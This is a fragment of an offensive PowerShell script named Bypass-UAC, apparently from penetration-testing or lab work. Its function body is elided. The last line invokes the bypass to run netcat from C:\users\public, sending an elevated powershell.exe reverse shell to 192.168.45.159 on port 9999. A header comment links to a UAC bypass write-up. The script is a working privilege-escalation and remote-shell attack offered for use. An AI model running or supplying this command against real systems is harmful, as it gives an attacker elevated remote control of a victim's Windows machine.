#modified by abbycyber where there is cmd.exe we can put powershell.exe
#more detailes https://juggernaut-sec.com/uac-bypass/
function Bypass-UAC{
	[CmdletBinding()]
...
Bypass-UAC 'C:\users\public\nc.exe 192.168.45.159 9999 - powershell.exe'
